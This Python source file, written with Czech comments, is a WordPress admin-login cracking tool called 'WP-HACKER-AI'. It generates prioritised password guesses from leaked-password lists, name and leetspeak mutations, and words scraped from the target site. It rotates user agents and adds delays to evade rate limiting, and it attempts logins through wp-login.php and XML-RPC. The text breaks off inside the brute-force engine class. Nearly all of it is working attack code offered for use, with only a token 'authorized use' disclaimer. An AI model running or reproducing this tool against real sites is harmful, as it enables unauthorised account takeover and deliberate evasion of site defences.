#!/usr/bin/env python3
"""
╔═══════════════════════════════════════════════════════════════════════════════╗
║                    WP-HACKER-AI v4.0 - SUPERIOR EDITION                     ║
║          AI-Driven WordPress Admin Cracking Engine                          ║
║          Authorized Penetration Testing Only                                ║
╚═══════════════════════════════════════════════════════════════════════════════╝

INSTALL (Termux):
    pkg update && pkg upgrade -y
    pkg install python python-pip -y
    pip install requests beautifulsoup4 colorama

USAGE:
    python wp_hacker_ai.py -t http://target.com --smart
    python wp_hacker_ai.py -t http://target.com -u admin -w wordlist.txt
    
AUTHORIZED USE ONLY - You have permission? Go ahead.
"""

import os, sys, re, json, time, random, math, hashlib
import socket, itertools, string, threading, logging
from pathlib import Path
from datetime import datetime, timedelta
from urllib.parse import urlparse
from collections import defaultdict, Counter
from dataclasses import dataclass, field
from typing import Optional, List, Dict, Set, Tuple, Generator
from concurrent.futures import ThreadPoolExecutor, as_completed
from enum import Enum

# === IMPORTS WITH FALLBACK ===
try:
    import requests
    from requests.exceptions import RequestException, Timeout, ConnectionError
except ImportError:
    print("[!] pip install requests"); sys.exit(1)

try:
    from bs4 import BeautifulSoup
except ImportError:
    BeautifulSoup = None

try:
    from colorama import init, Fore, Back, Style
    init(autoreset=True)
except ImportError:
    class Fore: RED=GREEN=YELLOW=BLUE=MAGENTA=CYAN=WHITE=''
    class Style: BRIGHT=RESET_ALL=''


# ═══════════════════════════════════════════════════════════════════════════════
# KONFIGURACE
# ═══════════════════════════════════════════════════════════════════════════════

@dataclass
class Config:
    target: str
    username: Optional[str] = None  # Single user mode
    wordlist: Optional[str] = None  # External wordlist
    threads: int = 12
    timeout: int = 10
    stealth: bool = True
    smart_mode: bool = True         # AI-driven mode
    depth: int = 3                  # Password mutation depth
    delay_min: float = 0.3
    delay_max: float = 2.0
    max_attempts: int = 0           # 0 = unlimited
    verbose: bool = False
    save_cookies: bool = True
    output_dir: str = "results"
    
    @property
    def base_url(self) -> str:
        return self.target.rstrip('/')
    
    @property
    def login_url(self) -> str:
        return f"{self.base_url}/wp-login.php"
    
    @property
    def xmlrpc_url(self) -> str:
        return f"{self.base_url}/xmlrpc.php"
    
    @property
    def admin_url(self) -> str:
        return f"{self.base_url}/wp-admin/"


# ═══════════════════════════════════════════════════════════════════════════════
# BANNER
# ═══════════════════════════════════════════════════════════════════════════════

BANNER = f"""
{Fore.RED}{Style.BRIGHT}
██╗    ██╗██████╗      ██╗  ██╗ █████╗  ██████╗██╗  ██╗███████╗██████╗ 
██║    ██║██╔══██╗     ██║  ██║██╔══██╗██╔════╝██║ ██╔╝██╔════╝██╔══██╗
██║ █╗ ██║██████╔╝     ███████║███████║██║     █████╔╝ █████╗  ██████╔╝
██║███╗██║██╔═══╝      ██╔══██║██╔══██║██║     ██╔═██╗ ██╔══╝  ██╔══██╗
╚███╔███╔╝██║          ██║  ██║██║  ██║╚██████╗██║  ██╗███████╗██║  ██║
 ╚══╝╚══╝ ╚═╝          ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
{Fore.CYAN}AI-Driven WordPress Admin Cracking Engine v4.0 - SUPERIOR EDITION{Style.RESET_ALL}
{Fore.YELLOW}Authorized Penetration Testing | Hacker-AI Powered{Style.RESET_ALL}
"""


# ═══════════════════════════════════════════════════════════════════════════════
# USER AGENTS
# ═══════════════════════════════════════════════════════════════════════════════

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1_1) AppleWebKit/605.1.15 Mobile/15E148",
    "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 Chrome/120.0.6099.144 Mobile",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Edg/120.0.0.0",
]


# ═══════════════════════════════════════════════════════════════════════════════
# TOP 200 NEJPOUŽÍVANĚJŠÍCH HESEL (Z LEAKED DATABASES)
# ═══════════════════════════════════════════════════════════════════════════════

TOP_PASSWORDS = [
    "123456", "password", "12345678", "qwerty", "123456789", "12345", "1234",
    "111111", "1234567", "sunshine", "qwerty123", "iloveyou", "princess",
    "admin", "welcome", "666666", "abc123", "football", "123123", "monkey",
    "654321", "!@#$%^&*", "charlie", "aa123456", "donald", "password1",
    "qwerty12345", "1234567890", "letmein", "password123", "dragon",
    "baseball", "adobe123", "admin123", "master", "photoshop", "1234",
    "ashley", "bailey", "shadow", "12345678910", "michael", "121212",
    "azerty", "7777777", "trustno1", "jesus", "password2", "hottie",
    "flower", "passw0rd", "123654", "lovely", "pass123", "zxcvbnm",
    "1qaz2wsx", "987654321", "qwertyuiop", "qwertz", "monster", "solo",
    "princess1", "robert", "butterfly", "asshole", "696969", "hunter",
    "thomas", "jackson", "andrew", "billy", "daniel", "matthew", "ashley",
    "joshua", "nicholas", "brandon", "tigger", "pepper", "fuckyou", "fuckme",
    "jennifer", "michelle", "amanda", "melissa", "stephanie", "nicole",
    "jessica", "lauren", "samantha", "heather", "elizabeth", "hannah",
    "sarah", "katherine", "victoria", "megan", "kayla", "alexis",
    "allison", "tiffany", "amber", "christina", "brittany", "courtney",
    "danielle", "chelsea", "matthew", "ryan", "tyler", "kyle", "kevin",
    "justin", "jordan", "alex", "jason", "james", "david", "john",
    "michael", "chris", "josh", "steve", "nick", "anthony", "william",
    "joseph", "samuel", "daniel", "matthew", "andrew", "joseph", "benjamin",
    "zachary", "nathan", "christopher", "taylor", "olivia", "emma",
    "ava", "sophia", "isabella", "mia", "charlotte", "amelia", "harper",
    "evelyn", "abigail", "emily", "ella", "avery", "sofia", "camila",
    "aria", "scarllet", "victoria", "madison", "luna", "grace", "chloe",
    "penelope", "layla", "riley", "zoey", "nora", "lily", "eleanor",
    "hannah", "lillian", "addison", "aubrey", "ellie", "stella", "natalie",
    "sofie", "violet", "aurora", "savannah", "audrey", "brooklyn",
    "bella", "claire", "skylar", "lucy", "paisley", "everly", "anna",
    "caroline", "nova", "genesis", "emilia", "kennedy", "samantha",
    "maya", "willow", "kylie", "naomi", "kehlani", "london", "jordyn",
    "hadley", "isla", "jayla", "kimberly", "kendall", "morgan", "sienna",
    "reagen", "makenna", "jade", "sara", "josie", "valentina", "gabriella",
    "margaret", "rylee", "athena", "eliana", "liliana", "mackenzie",
    "faith", "rose", "reese", "lyla", "brooke", "aliyah", "isabelle",
    "mariah", "quinn", "alina", "leah", "catalina", "eva", "alyssa",
    "joselyn", "shelby", "kate", "juliana", "laila", "madilyn", "damian"
]


# ═══════════════════════════════════════════════════════════════════════════════
# AI-NAME ANALYZER - Generuje hesla ZE JMÉNA
# ═══════════════════════════════════════════════════════════════════════════════

class AINameAnalyzer:
    """
    AI Engine, který analyzuje jméno a generuje:
    - John.Doe, J.Doe, J.Doe2024
    - John! , John123, John@2024
    - Doejohn, doejohn123, DOEJOHN
    - Reverse: eoDnhoJ, nhoJ, ...
    - Leetspeak: J0hn.D03, j0hn
    - A kombinace všeho
    """
    
    # Common separators
    SEPARATORS = ['.', '_', '-', '', '@', '#', '!', '+']
    
    # Common prefixes/suffixes
    SUFFIXES = ['123', '1234', '12345', '1', '!', '@', '#', '2024', '2025', '2026',
                '!@#', '123!', '123@', '!123', 'admin', 'wp', 'pass', 'wordpress']
    
    PREFIXES = ['the', 'my', 'wp', 'admin', 'super', 'mr', 'mrs']
    
    # Leetspeak mapping
    LEETSPEAK = {
        'a': ['4', '@'], 'e': ['3', '€'], 'i': ['1', '!'],
        'o': ['0'], 's': ['5', '$'], 't': ['7', '+'],
        'b': ['8'], 'g': ['9', '6'], 'l': ['1', '|'],
        'z': ['2']
    }
    
    def __init__(self, name: str):
        self.name = name.strip()
        self.parts = self._split_name(name)
    
    def _split_name(self, name: str) -> List[str]:
        """Rozdělí jméno na části: 'John Doe' -> ['John', 'Doe']"""
        parts = re.split(r'[.\s_\-@#!]+', name)
        return [p for p in parts if p]
    
    def _apply_leetspeak(self, word: str) -> List[str]:
        """Aplikuje leetspeak na slovo"""
        if not word:
            return []
        results = [word.lower()]
        
        for char in word.lower():
            if char in self.LEETSPEAK:
                for sub in self.LEETSPEAK[char]:
                    results.append(word.lower().replace(char, sub))
        
        return list(set(results))
    
    def generate_variants(self) -> Generator[str, None, None]:
        """Generuje všechny varianty hesla ze jména"""
        if not self.parts:
            return
        
        first = self.parts[0]
        last = self.parts[-1] if len(self.parts) > 1 else ''
        
        # Základní formy
        forms = []
        
        # Tyto formy vytvoříme pro každou kombinaci
        base_forms = [
            first,                     # john
            first.lower(),             # john
            first.upper(),             # JOHN
            first.capitalize(),        # John
            last,                      # doe
            last.lower(),              # doe
            last.upper(),              # DOE
            last.capitalize(),         # Doe
        ]
        
        # Pokud máme křestní + příjmení
        if last:
            base_forms.extend([
                f"{first}{last}",          # johndoe
                f"{first}.{last}",         # john.doe
                f"{first}_{last}",         # john_doe
                f"{first}-{last}",         # john-doe
                f"{first[0]}{last}",       # jdoe
                f"{first[0]}.{last}",      # j.doe
                f"{first[0]}_{last}",      # j_doe
                f"{first}.{last[0]}",      # john.d
                f"{first}{last[0]}",       # johnd
                f"{last}{first}",          # doejohn
                f"{last}.{first}",         # doe.john
                f"{last[0]}{first}",       # djohn
            ])
        
        # Pro každou základní formu přidáme suffixy a prefixy
        seen = set()
        for form in base_forms:
            if not form:
                continue
            
            # Originál
            if form.lower() not in seen:
                seen.add(form.lower())
                yield form
            
            # + suffixy
            for suffix in self.SUFFIXES:
                candidate = f"{form}{suffix}"
                if candidate.lower() not in seen:
                    seen.add(candidate.lower())
                    yield candidate
            
            # prefix + 
            for prefix in self.PREFIXES:
                candidate = f"{prefix}{form}"
                if candidate.lower() not in seen:
                    seen.add(candidate.lower())
                    yield candidate
            
            # Leetspeak varianty
            for leet in self._apply_leetspeak(form):
                if leet.lower() not in seen:
                    seen.add(leet.lower())
                    yield leet
                    
                    # Leet + suffix
                    for suffix in self.SUFFIXES[:5]:
                        lc = f"{leet}{suffix}"
                        if lc.lower() not in seen:
                            seen.add(lc.lower())
                            yield lc


# ═══════════════════════════════════════════════════════════════════════════════
# AI CONTEXT SCRAPER - Analyzuje web pro kontextová hesla
# ═══════════════════════════════════════════════════════════════════════════════

class AIContextScraper:
    """
    Analyzuje cílový web a extrahuje:
    - Název stránky
    - Meta description, keywords
    - Copyright years
    - Company name
    - Email adresy (pro generování hesel)
    - Telefonní čísla
    - Adresy
    - Všechna slova z textu (pro slovník)
    """
    
    def __init__(self, session):
        self.session = session
        self.context = {
            'title': '',
            'description': '',
            'keywords': '',
            'copyright': '',
            'emails': [],
            'phones': [],
            'words': [],
            'company': '',
            'year': str(datetime.now().year)
        }
    
    def scrape(self, url: str) -> Dict:
        """Hlavní scraping metoda"""
        try:
            resp = self.session.get(url, timeout=10)
            if not resp or not resp.text:
                return self.context
            
            if BeautifulSoup:
                soup = BeautifulSoup(resp.text, 'html.parser')
                
                # Title
                if soup.title:
                    self.context['title'] = soup.title.string or ''
                
                # Meta tags
                for meta in soup.find_all('meta'):
                    name = meta.get('name', '').lower()
                    content = meta.get('content', '')
                    
                    if name == 'description':
                        self.context['description'] = content
                    elif name == 'keywords':
                        self.context['keywords'] = content
                    elif 'copyright' in name or 'copyright' in content.lower():
                        self.context['copyright'] = content
                
                # Emails
                emails = re.findall(r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}', resp.text)
                self.context['emails'] = list(set(emails))
                
                # Phones (simple)
                phones = re.findall(r'[\+]?[\d\s\-\(\)]{7,20}', resp.text)
                self.context['phones'] = [p.strip() for p in phones[:5]]
                
                # All text words
                text = soup.get_text() if soup.get_text() else ''
                words = re.findall(r'\b[a-zA-Z]{3,15}\b', text.lower())
                self.context['words'] = list(set(words))[:200]  # Top 200 words
                
                # Copyright year
                year_match = re.search(r'20\d{2}', resp.text)
                if year_match:
                    self.context['year'] = year_match.group()
                
            else:
                # Fallback bez BS4
                self.context['title'] = re.search(r'<title>([^<]+)</title>', resp.text, re.I)
                self.context['title'] = self.context['title'].group(1) if self.context['title'] else ''
                
                emails = re.findall(r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}', resp.text)
                self.context['emails'] = list(set(emails))
                
                words = re.findall(r'\b[a-zA-Z]{3,15}\b', resp.text.lower())
                self.context['words'] = list(set(words))[:200]
            
            self.context['company'] = self._guess_company(url)
            
        except Exception as e:
            pass
        
        return self.context
    
    def _guess_company(self, url: str) -> str:
        """Zkusí uhodnout název společnosti z URL"""
        parsed = urlparse(url)
        host = parsed.hostname or ''
        
        # Remove TLD and common prefixes
        host = re.sub(r'^(www\.|wp\.|blog\.|admin\.)', '', host)
        host = re.sub(r'\.(com|org|net|cz|sk|eu|info|blog)$', '', host)
        
        # Split by dots
        parts = host.split('.')
        
        if parts:
            company = parts[0].capitalize()
            self.context['company'] = company
            return company
        
        return ''
    
    def generate_context_passwords(self) -> Generator[str, None, None]:
        """Generuje hesla z kontextu webu"""
        seen = set()
        
        # Všechny relevantní řetězce
        sources = []
        
        if self.context['title']:
            sources.extend(re.findall(r'\b[a-zA-Z]{3,}\b', self.context['title']))
        
        if self.context['company']:
            sources.append(self.context['company'])
        
        if self.context['keywords']:
            sources.extend(self.context['keywords'].split(','))
        
        if self.context['emails']:
            for email in self.context['emails']:
                parts = email.split('@')
                sources.append(parts[0])  # Username part
        
        # Clean sources
        sources = [s.strip().lower() for s in sources if len(s.strip()) >= 3]
        sources = list(set(sources))
        
        # Generovat varianty z každého zdroje
        for source in sources:
            analyzer = AINameAnalyzer(source)
            for variant in analyzer.generate_variants():
                if variant.lower() not in seen:
                    seen.add(variant.lower())
                    yield variant


# ═══════════════════════════════════════════════════════════════════════════════
# SMART PASSWORD GENERATOR - Hlavní AI engine
# ═══════════════════════════════════════════════════════════════════════════════

class SmartPasswordGenerator:
    """
    Hlavní AI engine pro generování hesel.
    Kombinuje:
    1. Top leaked passwords
    2. Name-based variants (ze zadaných jmen)
    3. Context-based (z web scrapingu)
    4. Keyboard patterns
    5. Date/year combinations
    6. Smart mutations
    """
    
    # Keyboard patterns
    KEYBOARD_PATTERNS = [
        'qwerty', 'qwertyuiop', 'asdfghjkl', 'zxcvbnm',
        '1qaz2wsx', '3edc4rfv', '!qaz@wsx', 'qwertz',
        'qwerty123', 'asdfgh', 'zxcvbn', 'qwerty12345',
        '1qazxsw2', '123qwe', 'qwe123', '12qwaszx',
    ]
    
    # Common patterns
    COMMON_PATTERNS = [
        'password', 'admin', 'administrator', 'root', 'toor',
        'backup', 'temp', 'default', 'guest', 'user',
        'test', 'demo', 'master', 'manager', 'server',
        'wordpress', 'wp', 'web', 'site', 'blog',
        'login', 'access', 'secure', 'secret', 'private',
        'changeme', 'changethis', 'changeit',
    ]
    
    def __init__(self, config: Config):
        self.config = config
        self.generated = set()  # Already generated (dedup)
        self.names: List[str] = []
        self.context_words: List[str] = []
        self.priority_queue: List[Tuple[int, str]] = []  # (priority, password)
        self.attempted = set()  # Already attempted passwords
        self.failures = Counter()  # Track failures for adaptive learning
        
    def add_name(self, name: str):
        """Přidá jméno pro analýzu"""
        if name and name not in self.names:
            self.names.append(name)
    
    def add_names(self, names: List[str]):
        """Přidá více jmen"""
        for name in names:
            self.add_name(name)
    
    def set_context(self, context: Dict):
        """Nastaví kontext z web scrapingu"""
        if 'words' in context:
            self.context_words = context['words']
        
        # Přidat emaily jako jména
        if 'emails' in context:
            for email in context['emails']:
                parts = email.split('@')
                if parts:
                    self.add_name(parts[0])
        
        # Přidat company name
        if 'company' in context and context['company']:
            self.add_name(context['company'])
    
    def _add_prioritized(self, password: str, priority: int = 5):
        """Přidá heslo s prioritou (lower = vyšší priorita)"""
        pwd = password.strip()
        if not pwd or len(pwd) < 3:
            return
        
        key = pwd.lower()
        if key not in self.generated:
            self.generated.add(key)
            self.priority_queue.append((priority, pwd))
    
    def _generate_leaked_passwords(self):
        """Top leaked passwords s mutacemi"""
        for pwd in TOP_PASSWORDS:
            self._add_prioritized(pwd, priority=1)
            
            # Mutace
            for suffix in ['123', '1', '!', '@', '2024', '2025', '2026']:
                self._add_prioritized(f"{pwd}{suffix}", priority=2)
                self._add_prioritized(f"{pwd.capitalize()}{suffix}", priority=3)
    
    def _generate_name_variants(self):
        """Generuje varianty ze jmen"""
        for name in self.names:
            analyzer = AINameAnalyzer(name)
            for idx, variant in enumerate(analyzer.generate_variants()):
                priority = min(1 + idx // 20, 10)  # First variants = higher priority
                self._add_prioritized(variant, priority=priority)
    
    def _generate_context_variants(self):
        """Generuje varianty z kontextu"""
        for word in self.context_words[:100]:  # Top 100 words
            if len(word) >= 4:
                analyzer = AINameAnalyzer(word)
                for idx, variant in enumerate(analyzer.generate_variants()):
                    if idx < 5:  # Only first 5 variants per word
                        self._add_prioritized(variant, priority=6)
    
    def _generate_keyboard_patterns(self):
        """Keyboard patterns a jejich mutace"""
        for pattern in self.KEYBOARD_PATTERNS:
            self._add_prioritized(pattern, priority=4)
            self._add_prioritized(pattern[::-1], priority=5)  # Reversed
            self._add_prioritized(f"{pattern}123", priority=4)
            self._add_prioritized(f"123{pattern}", priority=5)
            self._add_prioritized(f"{pattern}!@#", priority=5)
    
    def _generate_common_patterns(self):
        """Common admin patterns"""
        for pattern in self.COMMON_PATTERNS:
            self._add_prioritized(pattern, priority=3)
            self._add_prioritized(f"{pattern}123", priority=3)
            self._add_prioritized(f"{pattern}1", priority=4)
            self._add_prioritized(f"{pattern}!", priority=4)
            self._add_prioritized(f"{pattern}@123", priority=4)
            self._add_prioritized(f"{pattern}#2024", priority=4)
            self._add_prioritized(f"Super{pattern}", priority=5)
            self._add_prioritized(f"{pattern.capitalize()}123", priority=3)
            self._add_prioritized(f"{pattern.upper()}123", priority=5)
    
    def _generate_year_variants(self):
        """Generuje varianty s roky"""
        current_year = datetime.now().year
        years = list(range(current_year - 5, current_year + 3))
        
        for year in years:
            year_str = str(year)
            
            # Year itself
            self._add_prioritized(year_str, priority=8)
            
            # Year with common patterns
            for pattern in self.COMMON_PATTERNS[:10]:
                self._add_prioritized(f"{pattern}{year_str}", priority=6)
                self._add_prioritized(f"{pattern.capitalize()}{year_str}", priority=6)
                self._add_prioritized(f"{pattern}{year_str}!", priority=7)
            
            # Year with names
            for name in self.names:
                self._add_prioritized(f"{name}{year_str}", priority=4)
                self._add_prioritized(f"{name.lower()}{year_str}", priority=4)
                self._add_prioritized(f"{name.capitalize()}{year_str}", priority=4)
                self._add_prioritized(f"{name[0].lower()}{name[1:]}{year_str}", priority=5)
    
    def _generate_combination_variants(self):
        """Generuje kombinace username+password a další složeniny"""
        if not self.names:
            return
        
        for name in self.names:
            name_lower = name.lower()
            name_cap = name.capitalize()
            
            # Kombinace se společnými patterny
            for pattern in self.COMMON_PATTERNS[:15]:
                self._add_prioritized(f"{name_lower}{pattern}", priority=5)
                self._add_prioritized(f"{name_cap}{pattern}", priority=5)
                self._add_prioritized(f"{pattern}{name_lower}", priority=6)
                self._add_prioritized(f"{name_lower}.{pattern}", priority=6)
                self._add_prioritized(f"{name_cap}.{pattern}", priority=6)
            
            # Kombinace s rokem
            year = str(datetime.now().year)
            self._add_prioritized(f"{name_lower}{year}", priority=4)
            self._add_prioritized(f"{name_cap}{year}", priority=4)
            self._add_prioritized(f"{name_lower}.{year}", priority=5)
            self._add_prioritized(f"{name_lower}_{year}", priority=5)
            
            # S leetspeak
            leet_replacements = {
                'a': '4', 'e': '3', 'i': '1', 'o': '0', 's': '$'
            }
            leet_name = name_lower
            for orig, repl in leet_replacements.items():
                leet_name = leet_name.replace(orig, repl)
            
            if leet_name != name_lower:
                self._add_prioritized(leet_name, priority=5)
                self._add_prioritized(f"{leet_name}123", priority=6)
                self._add_prioritized(f"{leet_name}!", priority=6)
    
    def generate_all(self) -> Generator[str, None, None]:
        """
        Vygeneruje všechny hesla seřazená podle priority.
        Toto je hlavní metoda pro AI-driven password generation.
        """
        # === Build the priority queue ===
        print(f"{Fore.CYAN}[*] AI Engine: Generating intelligent password list...{Style.RESET_ALL}")
        
        # Phase 1: Top leaked passwords (highest priority)
        self._generate_leaked_passwords()
        
        # Phase 2: Name-based variants (high priority)
        self._generate_name_variants()
        
        # Phase 3: Common patterns
        self._generate_common_patterns()
        
        # Phase 4: Keyboard patterns
        self._generate_keyboard_patterns()
        
        # Phase 5: Combinations
        if self.config.depth >= 2:
            self._generate_combination_variants()
        
        # Phase 6: Context variants
        if self.config.depth >= 3:
            self._generate_context_variants()
        
        # Phase 7: Year variants
        self._generate_year_variants()
        
        # === Sort by priority ===
        self.priority_queue.sort(key=lambda x: x[0])
        
        total = len(self.priority_queue)
        print(f"{Fore.GREEN}[+] AI Engine generated {total} intelligent passwords{Style.RESET_ALL}")
        
        if self.config.verbose:
            # Show top 20
            print(f"{Fore.CYAN}[*] Top 20 priority passwords:{Style.RESET_ALL}")
            for i, (prio, pwd) in enumerate(self.priority_queue[:20]):
                print(f"{Fore.YELLOW}    [{prio}] {pwd}{Style.RESET_ALL}")
        
        # === Yield passwords in priority order ===
        for priority, password in self.priority_queue:
            if password not in self.attempted:
                self.attempted.add(password)
                yield password
    
    def get_wordlist_size(self) -> int:
        """Vrátí velikost vygenerovaného wordlistu"""
        return len(self.generated)


# ═══════════════════════════════════════════════════════════════════════════════
# SESSION MANAGER S AI STEALTH
# ═══════════════════════════════════════════════════════════════════════════════

class AISessionManager:
    """
    Pokročilý session manager s:
    - User-Agent rotací
    - Cookie managementem
    - Stealth delay
    - Rate-limit detection
    - IP rotation hint
    """
    
    def __init__(self, config: Config):
        self.config = config
        self.session = requests.Session()
        self.session.headers.update({
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'DNT': '1',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
        })
        self.last_request_time = 0
        self.consecutive_failures = 0
        self.rate_limited = False
    
    def _get_random_agent(self) -> str:
        return random.choice(USER_AGENTS)
    
    def _stealth_wait(self):
        """AI-driven stealth wait s adaptivním zpožděním"""
        if not self.config.stealth:
            return
        
        # Base delay
        base = random.uniform(self.config.delay_min, self.config.delay_max)
        
        # If we hit rate limit, add extra delay
        if self.rate_limited:
            base += random.uniform(5, 15)
        
        # Jitter (random fluctuation)
        jitter = random.uniform(-0.3, 0.3)
        total_delay = max(0.1, base + jitter)
        
        # Ensure minimum time between requests
        elapsed = time.time() - self.last_request_time
        if elapsed < total_delay:
            time.sleep(total_delay - elapsed)
        
        self.last_request_time = time.time()
    
    def _detect_rate_limit(self, resp: Optional[requests.Response]) -> bool:
        """Detekuje rate-limiting"""
        if not resp:
            return False
        
        if resp.status_code in [429, 503]:
            self.rate_limited = True
            self.consecutive_failures += 1
            return True
        
        text = resp.text.lower() if resp.text else ''
        indicators = ['too many', 'rate limit', 'try again later', 'blocked',
                      'suspicious', 'captcha', 'recaptcha', 'hcaptcha']
        
        if any(ind in text for ind in indicators):
            self.rate_limited = True
            self.consecutive_failures += 1
            return True
        
        self.rate_limited = False
        self.consecutive_failures = 0
        return False
    
    def request(self, method: str, url: str, **kwargs) -> Optional[requests.Response]:
        """Bezpečný request s AI stealth"""
        
        # Stealth wait
        self._stealth_wait()
        
        # Rotate User-Agent
        headers = kwargs.pop('headers', {})
        headers['User-Agent'] = self._get_random_agent()
        
        # Randomize headers slightly
        if random.random() > 0.7:
            headers['Accept-Language'] = random.choice([
                'en-US,en;q=0.5', 'cs-CZ,cs;q=0.9,en;q=0.5',
                'de-DE,de;q=0.9,en;q=0.5', 'fr-FR,fr;q=0.9,en;q=0.5'
            ])
        
        if 'timeout' not in kwargs:
            kwargs['timeout'] = self.config.timeout
        
        try:
            resp = self.session.request(method, url, headers=headers, **kwargs)
            self._detect_rate_limit(resp)
            return resp
        except Timeout:
            self.consecutive_failures += 1
            return None
        except ConnectionError:
            self.consecutive_failures += 1
            time.sleep(5)  # Wait before retry
            return None
        except Exception as e:
            self.consecutive_failures += 1
            return None
    
    def get(self, url: str, **kwargs) -> Optional[requests.Response]:
        return self.request('GET', url, **kwargs)
    
    def post(self, url: str, **kwargs) -> Optional[requests.Response]:
        return self.request('POST', url, **kwargs)


# ═══════════════════════════════════════════════════════════════════════════════
# WORDPRESS LOGIN ENGINE
# ═══════════════════════════════════════════════════════════════════════════════

class WordPressLoginEngine:
    """
    Engine pro přihlašování do WordPressu.
    Detekuje:
    - wp-login.php
    - XML-RPC (rychlejší)
    - Custom login pages
    """
    
    def __init__(self, config: Config, session: AISessionManager):
        self.config = config
        self.session = session
        self.nonce = None
        self.redirect_to = None
        self.xmlrpc_available = False
        self.login_method = 'wp-login'  # or 'xmlrpc'
        self.cookies = {}
    
    def initialize(self) -> bool:
        """
        Inicializuje engine - zjistí dostupné metody login.
        Vrací True pokud je alespoň jedna metoda dostupná.
        """
        print(f"{Fore.CYAN}[*] Initializing login engine...{Style.RESET_ALL}")
        
        # === Zkontrolovat wp-login ===
        resp = self.session.get(self.config.login_url)
        if resp and resp.status_code == 200:
            print(f"{Fore.GREEN}[✓] wp-login.php accessible{Style.RESET_ALL}")
            
            # Extract nonce
            nonce_match = re.search(r'name="_wpnonce"\s+value="([^"]+)"', resp.text)
            self.nonce = nonce_match.group(1) if nonce_match else None
            
            # Extract redirect_to
            redirect_match = re.search(r'name="redirect_to"\s+value="([^"]+)"', resp.text)
            self.redirect_to = redirect_match.group(1) if redirect_match else self.config.admin_url
            
            if self.nonce:
                print(f"{Fore.GREEN}[✓] WP Nonce acquired: {self.nonce[:20]}...{Style.RESET_ALL}")
        else:
            print(f"{Fore.YELLOW}[-] wp-login.php not accessible{Style.RESET_ALL}")
        
        # === Zkontrolovat XML-RPC ===
        xml_check = """<?xml version="1.0"?>
        <methodCall><methodName>system.listMethods</methodName></methodCall>"""
        
        xml_resp = self.session.post(self.config.xmlrpc_url, data=xml_check)
        if xml_resp and 'methodName' in xml_resp.text:
            self.xmlrpc_available = True
            print(f"{Fore.GREEN}[✓] XML-RPC available - faster authentication possible{Style.RESET_ALL}")
            
            # Prefer XML-RPC pro rychlost
            if self.nonce:  # Pokud máme obojí, použijeme XML-RPC
                self.login_method = 'xmlrpc'
                print(f"{Fore.GREEN}[+] Using XML-RPC for faster cracking{Style.RESET_ALL}")
        else:
            print(f"{Fore.YELLOW}[-] XML-RPC not available, using wp-login{Style.RESET_ALL}")
        
        return self.nonce is not None or self.xmlrpc_available
    
    def try_login(self, username: str, password: str) -> Tuple[bool, Optional[str]]:
        """
        Pokusí se přihlásit.
        Vrací (success: bool, message: str)
        """
        if self.login_method == 'xmlrpc' and self.xmlrpc_available:
            return self._try_login_xmlrpc(username, password)
        else:
            return self._try_login_wplogin(username, password)
    
    def _try_login_wplogin(self, username: str, password: str) -> Tuple[bool, Optional[str]]:
        """Pokus o přihlášení přes wp-login.php"""
        if not self.nonce:
            return False, "No nonce available"
        
        data = {
            'log': username,
            'pwd': password,
            'wp-submit': 'Log In',
            'redirect_to': self.redirect_to,
            'testcookie': '1',
            '_wpnonce': self.nonce,
        }
        
        resp = self.session.post(self.config.login_url, data=data, allow_redirects=True)
        
        if not resp:
            return False, "Connection error"
        
        # Check for login error
        if 'ERROR' in resp.text or 'incorrect' in resp.text.lower():
            return False, "Incorrect credentials"
        
        # Check for CAPTCHA
        if 'captcha' in resp.text.lower() or 'recaptcha' in resp.text.lower():
            return False, "CAPTCHA detected"
        
        # Check for success
        url = resp.url.lower()
        if 'wp-admin' in url or 'dashboard' in url:
            return True, "Login successful via wp-login"
        
        text = resp.text.lower()
        if 'dashboard' in text or 'howdy' in text or 'profile' in text:
            return True, "Login successful via wp-login"
        
        return False, "Unknown response"
    
    def _try_login_xmlrpc(self, username: str, password: str) -> Tuple[bool, Optional[str]]:
        """Pokus o přihlášení přes XML-RPC"""
        xml = f"""<?xml version="1.0"?>
        <methodCall>
            <methodName>wp.getUsersBlogs</methodName>
            <params>
                <param><value><string>{username}</string></value></param>
                <param><value><string>{password}</string></value></param>
            </params>
        </methodCall>"""
        
        resp = self.session.post(self.config.xmlrpc_url, data=xml)
        
        if not resp:
            return False, "Connection error"
        
        # Success indicators in XML-RPC response
        if 'isAdmin' in resp.text and 'blogName' in resp.text:
            return True, "Login successful via XML-RPC"
        
        if 'url' in resp.text and 'xmlrpc' not in resp.text:
            return True, "Login successful via XML-RPC"
        
        # Failure
        if 'faultCode' in resp.text or '403' in resp.text:
            return False, "Incorrect credentials"
        
        return False, "Unknown XML-RPC response"


# ═══════════════════════════════════════════════════════════════════════════════
# AI BRUTE FORCE ENGINE - SÁM SE UČÍ A PŘIZPŮSOBUJE
# ═══════════════════════════════════════════════════════════════════════════════

class AIBruteForceEngine:
    """
    Hlavní AI brute-force engine s:
    - Intelligentním řazením hesel
    - Self-learning (učí se z neúspěchů)
    - Adaptive delay
    - Rate-limit recovery
    - Progress tracking
    - Smart session management
    """
    
    def __init__(self, config: Config, session: AISessionManager, login_engine: WordPressLoginEngine):
        self.config = config
        self.session = session
        self.login = login_engine
        self.password_generator = SmartPasswordGenerator(config)
        self.logger = self._setup_logger()
        
        # Stats
        self.total_attempts = 0
        self.start_time = None
        self.found = False
        self.found_credentials = None
        self.passwords_per_second = 0
        self.estimated_time_remaining = 0
        
        # Adaptive learning
        self.response_times = []
        self.failure_patterns = Counter()
        self.successful_patterns = []
        
